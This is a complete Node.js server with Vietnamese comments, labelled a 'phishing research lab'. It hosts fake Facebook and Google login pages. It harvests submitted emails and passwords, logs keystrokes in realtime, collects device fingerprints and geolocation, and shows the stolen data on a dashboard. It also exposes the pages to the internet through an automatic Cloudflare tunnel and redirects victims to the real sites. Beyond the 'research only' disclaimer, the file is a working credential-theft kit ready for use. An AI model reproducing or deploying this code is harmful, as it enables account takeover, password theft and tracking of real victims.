/**
 * ============================================================
 *  PHISHING RESEARCH LAB - Server Backend (v2.0)
 *  Mục đích: Nghiên cứu bảo mật - CHỈ DÙNG CHO MỤC ĐÍCH HỌC TẬP
 * ============================================================
 * 
 *  Tính năng:
 *  1. Phục vụ trang phishing giả mạo (Facebook, Google)
 *  2. Thu thập credentials khi nạn nhân submit form
 *  3. Keylogger realtime - ghi từng phím gõ
 *  4. Dashboard premium để xem/phân tích dữ liệu
 *  5. Tự động tạo Cloudflare Tunnel → truy cập qua Internet
 *     (KHÔNG CẦN cùng WiFi!)
 */

const express = require('express');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawn } = require('child_process');

const app = express();
const PORT = 3000;

// Biến lưu tunnel URL
let tunnelUrl = null;
let tunnelStatus = 'starting'; // starting, connected, failed

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// File lưu trữ dữ liệu
const DATA_FILE = path.join(__dirname, 'harvested_data.json');
const KEYLOG_FILE = path.join(__dirname, 'keylog_data.json');
const FINGERPRINT_FILE = path.join(__dirname, 'fingerprint_data.json');

// Khởi tạo files nếu chưa có
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
}
if (!fs.existsSync(KEYLOG_FILE)) {
    fs.writeFileSync(KEYLOG_FILE, JSON.stringify([], null, 2));
}
if (!fs.existsSync(FINGERPRINT_FILE)) {
    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify([], null, 2));
}

// ==========================================
//  ROUTE: Phục vụ trang phishing (giả mạo)
// ==========================================
app.use('/phishing', express.static(path.join(__dirname, 'public', 'phishing')));

// ==========================================
//  API: Thu hoạch credentials
// ==========================================
app.post('/api/harvest', (req, res) => {
    const { email, password, page_type } = req.body;
    
    const entry = {
        id: Date.now(),
        timestamp: new Date().toISOString(),
        page_type: page_type || 'facebook',
        credentials: {
            email: email || '',
            password: password || ''
        },
        metadata: {
            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
            user_agent: req.headers['user-agent'] || '',
            referer: req.headers['referer'] || '',
            accept_language: req.headers['accept-language'] || '',
            platform: extractPlatform(req.headers['user-agent'] || ''),
            screen_info: req.body.screen_info || null
        }
    };

    let data = [];
    try {
        data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch (e) {
        data = [];
    }

    data.push(entry);
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));

    // Tìm fingerprint của session này
    let fp = null;
    try {
        const fpData = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
        fp = fpData.find(f => f.session_id && req.body.session_id && f.session_id === req.body.session_id) || fpData[fpData.length - 1];
    } catch(e) {}

    // Log ra terminal
    console.log('\n' + '='.repeat(60));
    console.log('🎣 DỮ LIỆU MỚI THU HOẠCH ĐƯỢC!');
    console.log('='.repeat(60));
    console.log(`⏰ Thời gian:  ${entry.timestamp}`);
    console.log(`📄 Loại trang: ${entry.page_type.toUpperCase()}`);
    console.log(`📧 Email/SĐT:  ${entry.credentials.email}`);
    console.log(`🔑 Mật khẩu:   ${entry.credentials.password}`);
    console.log(`📱 Thiết bị:   ${entry.metadata.platform}`);
    console.log(`🌐 IP:         ${entry.metadata.ip}`);
    if (fp) {
        console.log(`📲 Tên máy:    ${fp.device?.device_name || 'N/A'}`);
        console.log(`💻 OS:         ${fp.device?.os || ''} ${fp.device?.os_version || ''}`);
        console.log(`🌍 Trình duyệt: ${fp.device?.browser || ''} ${fp.device?.browser_version || ''}`);
        if (fp.location && !fp.location.error) {
            console.log(`📍 Vị trí:     ${fp.location.latitude}, ${fp.location.longitude}`);
            console.log(`🗺️  Maps:       ${fp.location.google_maps}`);
        } else {
            console.log(`📍 Vị trí:     ${fp.location?.error || 'Chưa có'}`);
        }
    }
    console.log('='.repeat(60) + '\n');

    res.json({ 
        success: true, 
        redirect: getRedirectUrl(page_type) 
    });
});

// ==========================================
//  API: Keylogger - ghi từng phím gõ realtime
// ==========================================
app.post('/api/keylog', (req, res) => {
    const { field, value, key, page_type, session_id } = req.body;
    
    const entry = {
        timestamp: new Date().toISOString(),
        session_id: session_id || 'unknown',
        page_type: page_type || 'facebook',
        field: field || '',
        key: key || '',
        current_value: value || '',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
        platform: extractPlatform(req.headers['user-agent'] || '')
    };

    let data = [];
    try {
        data = JSON.parse(fs.readFileSync(KEYLOG_FILE, 'utf8'));
    } catch (e) {
        data = [];
    }

    // Giữ tối đa 5000 keylog entries
    if (data.length > 5000) {
        data = data.slice(-2500);
    }
    data.push(entry);
    fs.writeFileSync(KEYLOG_FILE, JSON.stringify(data, null, 2));

    res.json({ ok: true });
});

// ==========================================
//  API: Fingerprint - thu thập thiết bị + vị trí
// ==========================================
app.post('/api/fingerprint', (req, res) => {
    const fingerprint = {
        ...req.body,
        server_ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
        received_at: new Date().toISOString()
    };

    let data = [];
    try {
        data = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
    } catch (e) {
        data = [];
    }

    // Giữ tối đa 500 fingerprints
    if (data.length > 500) data = data.slice(-250);
    data.push(fingerprint);
    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify(data, null, 2));

    // Log thiết bị + vị trí
    const dev = fingerprint.device || {};
    const loc = fingerprint.location || {};
    console.log('\n' + '-'.repeat(50));
    console.log('📲 THIẾT BỊ MỚI TRUY CẬP!');
    console.log('-'.repeat(50));
    console.log(`📱 Tên máy:    ${dev.device_name || 'N/A'}`);
    console.log(`💻 OS:         ${dev.os || ''} ${dev.os_version || ''}`);
    console.log(`🌍 Trình duyệt: ${dev.browser || ''} v${dev.browser_version || ''}`);
    console.log(`📐 Màn hình:   ${dev.screen_width}x${dev.screen_height} (@${dev.pixel_ratio}x)`);
    console.log(`🔌 Kết nối:    ${dev.connection?.type || 'N/A'}`);
    if (loc.latitude) {
        console.log(`📍 VỊ TRÍ:     ${loc.latitude}, ${loc.longitude} (±${loc.accuracy})`);
        console.log(`🗺️  Google Maps: ${loc.google_maps}`);
    } else {
        console.log(`📍 Vị trí:     ${loc.error || 'Đang chờ...'}`);
    }
    if (fingerprint.battery) {
        console.log(`🔋 Pin:        ${fingerprint.battery.level} (${fingerprint.battery.charging})`);
    }
    console.log('-'.repeat(50) + '\n');

    res.json({ ok: true });
});

// API lấy fingerprint data
app.get('/api/fingerprints', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
        res.json({ total: data.length, entries: data.reverse() });
    } catch (e) {
        res.json({ total: 0, entries: [] });
    }
});

// ==========================================
//  DASHBOARD Routes
// ==========================================
app.use('/dashboard', express.static(path.join(__dirname, 'public', 'dashboard')));

// API lấy dữ liệu
app.get('/api/data', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        res.json({
            total: data.length,
            entries: data.reverse()
        });
    } catch (e) {
        res.json({ total: 0, entries: [] });
    }
});

// API lấy keylog data
app.get('/api/keylog', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(KEYLOG_FILE, 'utf8'));
        // Nhóm theo session
        const sessions = {};
        data.forEach(entry => {
            const sid = entry.session_id || 'unknown';
            if (!sessions[sid]) {
                sessions[sid] = {
                    session_id: sid,
                    page_type: entry.page_type,
                    ip: entry.ip,
                    platform: entry.platform,
                    start_time: entry.timestamp,
                    keystrokes: []
                };
            }
            sessions[sid].keystrokes.push({
                time: entry.timestamp,
                field: entry.field,
                key: entry.key,
                value: entry.current_value
            });
            sessions[sid].end_time = entry.timestamp;
        });
        
        res.json({
            total_keystrokes: data.length,
            sessions: Object.values(sessions).reverse()
        });
    } catch (e) {
        res.json({ total_keystrokes: 0, sessions: [] });
    }
});

// API xóa toàn bộ dữ liệu
app.delete('/api/data', (req, res) => {
    fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
    fs.writeFileSync(KEYLOG_FILE, JSON.stringify([], null, 2));
    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify([], null, 2));
    console.log('🗑️  Đã xóa toàn bộ dữ liệu.');
    res.json({ success: true });
});

// API xóa 1 harvest entry theo timestamp
app.delete('/api/data/:timestamp', (req, res) => {
    try {
        let data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        const before = data.length;
        data = data.filter(e => e.timestamp !== decodeURIComponent(req.params.timestamp));
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        res.json({ success: true, removed: before - data.length });
    } catch(e) { res.json({ success: false }); }
});

// API xóa 1 fingerprint entry theo received_at
app.delete('/api/fingerprint/:received_at', (req, res) => {
    try {
        let data = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
        const before = data.length;
        data = data.filter(e => e.received_at !== decodeURIComponent(req.params.received_at));
        fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify(data, null, 2));
        res.json({ success: true, removed: before - data.length });
    } catch(e) { res.json({ success: false }); }
});

// API đếm số entries (để check có data mới không)
app.get('/api/count', (req, res) => {
    try {
        const harvest = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')).length;
        const fp = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8')).length;
        res.json({ harvest, fp, total: harvest + fp });
    } catch(e) { res.json({ harvest: 0, fp: 0, total: 0 }); }
});

// API thống kê
app.get('/api/stats', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        const keylogData = JSON.parse(fs.readFileSync(KEYLOG_FILE, 'utf8'));
        
        const stats = {
            total_entries: data.length,
            total_keystrokes: keylogData.length,
            by_platform: {},
            by_page_type: {},
            timeline: {},
            recent_activity: data.slice(-5).reverse()
        };

        data.forEach(entry => {
            const platform = entry.metadata?.platform || 'Unknown';
            stats.by_platform[platform] = (stats.by_platform[platform] || 0) + 1;

            const pageType = entry.page_type || 'unknown';
            stats.by_page_type[pageType] = (stats.by_page_type[pageType] || 0) + 1;

            const date = entry.timestamp.split('T')[0];
            stats.timeline[date] = (stats.timeline[date] || 0) + 1;
        });

        res.json(stats);
    } catch (e) {
        res.json({ total_entries: 0, total_keystrokes: 0, by_platform: {}, by_page_type: {}, timeline: {} });
    }
});

// API lấy tunnel URL
app.get('/api/tunnel', (req, res) => {
    res.json({ 
        url: tunnelUrl,
        status: tunnelStatus,
        phishing_links: tunnelUrl ? {
            facebook: `${tunnelUrl}/phishing/facebook.html`,
            google: `${tunnelUrl}/phishing/google.html`
        } : null
    });
});

// ==========================================
//  Trang chủ → Dashboard
// ==========================================
app.get('/', (req, res) => {
    res.redirect('/dashboard');
});

// ==========================================
//  Hàm tiện ích
// ==========================================
function extractPlatform(userAgent) {
    if (/iPhone/i.test(userAgent)) return 'iPhone';
    if (/iPad/i.test(userAgent)) return 'iPad';
    if (/Android/i.test(userAgent)) return 'Android';
    if (/Windows Phone/i.test(userAgent)) return 'Windows Phone';
    if (/Windows/i.test(userAgent)) return 'Windows PC';
    if (/Macintosh/i.test(userAgent)) return 'Mac';
    if (/Linux/i.test(userAgent)) return 'Linux';
    return 'Unknown';
}

function getRedirectUrl(pageType) {
    const redirects = {
        'facebook': 'https://www.facebook.com',
        'google': 'https://accounts.google.com',
        'banking': 'https://www.google.com',
        'zalo': 'https://zalo.me'
    };
    return redirects[pageType] || 'https://www.facebook.com';
}

function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return '127.0.0.1';
}

// ==========================================
//  Cloudflare Tunnel (tự động)
// ==========================================
function startTunnel() {
    console.log('\n  🌐 Đang tạo Cloudflare Tunnel...');
    console.log('  ⏳ Chờ khoảng 10-20 giây...\n');
    
    tunnelStatus = 'starting';

    const cf = spawn('npx', ['-y', 'cloudflared', 'tunnel', '--url', `http://localhost:${PORT}`], {
        shell: true,
        stdio: ['ignore', 'pipe', 'pipe']
    });

    cf.stderr.on('data', (data) => {
        const output = data.toString();
        const match = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
        if (match && !tunnelUrl) {
            tunnelUrl = match[0];
            tunnelStatus = 'connected';
            
            console.log('╔' + '═'.repeat(62) + '╗');
            console.log('║' + ' '.repeat(10) + '🌍 CLOUDFLARE TUNNEL - SẴN SÀNG!' + ' '.repeat(19) + '║');
            console.log('╠' + '═'.repeat(62) + '╣');
            console.log('║' + ' '.repeat(62) + '║');
            console.log('║  📘 Facebook Phishing:' + ' '.repeat(38) + '║');
            console.log(`║  ${tunnelUrl}/phishing/facebook.html`.padEnd(63) + '║');
            console.log('║' + ' '.repeat(62) + '║');
            console.log('║  📧 Google Phishing:' + ' '.repeat(40) + '║');
            console.log(`║  ${tunnelUrl}/phishing/google.html`.padEnd(63) + '║');
            console.log('║' + ' '.repeat(62) + '║');
            console.log('║  📱 Mở link trên điện thoại bất kỳ mạng (4G/WiFi khác)' + ' '.repeat(5) + '║');
            console.log('║     → KHÔNG CẦN cùng mạng WiFi!' + ' '.repeat(29) + '║');
            console.log('║' + ' '.repeat(62) + '║');
            console.log('║  📊 Dashboard: http://localhost:' + PORT + '/dashboard' + ' '.repeat(18) + '║');
            console.log('╚' + '═'.repeat(62) + '╝');
            console.log('');
        }
    });

    cf.stdout.on('data', (data) => {
        const output = data.toString();
        const match = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
        if (match && !tunnelUrl) {
            tunnelUrl = match[0];
            tunnelStatus = 'connected';
            console.log(`\n  🌍 Tunnel URL: ${tunnelUrl}\n`);
        }
    });

    cf.on('error', (err) => {
        tunnelStatus = 'failed';
        console.log('\n  ❌ Không thể khởi động Cloudflare Tunnel.');
        console.log('  💡 Chạy thủ công: npx cloudflared tunnel --url http://localhost:3000');
        console.log('  Lỗi:', err.message);
    });

    cf.on('close', (code) => {
        if (code !== 0 && code !== null) {
            tunnelStatus = 'failed';
            console.log(`\n  ⚠️  Tunnel đã dừng (code: ${code})`);
        }
    });
}

// ==========================================
//  Khởi động server
// ==========================================
app.listen(PORT, '0.0.0.0', () => {
    const localIP = getLocalIP();
    
    console.log('');
    console.log('╔' + '═'.repeat(62) + '╗');
    console.log('║' + ' '.repeat(10) + '🔬 PHISHING RESEARCH LAB v2.0' + ' '.repeat(22) + '║');
    console.log('╠' + '═'.repeat(62) + '╣');
    console.log('║' + ' '.repeat(62) + '║');
    console.log('║  📊 Dashboard:  http://localhost:' + PORT + '/dashboard' + ' '.repeat(17) + '║');
    console.log(`║  🌐 Local IP:   http://${localIP}:${PORT}`.padEnd(63) + '║');
    console.log('║' + ' '.repeat(62) + '║');
    console.log('║  📘 Facebook:   /phishing/facebook.html' + ' '.repeat(21) + '║');
    console.log('║  📧 Google:     /phishing/google.html' + ' '.repeat(23) + '║');
    console.log('║' + ' '.repeat(62) + '║');
    console.log('║  ⚠️  CHỈ DÙNG CHO MỤC ĐÍCH NGHIÊN CỨU!' + ' '.repeat(20) + '║');
    console.log('╚' + '═'.repeat(62) + '╝');
    console.log('');

    // Tự động khởi động tunnel
    startTunnel();
});
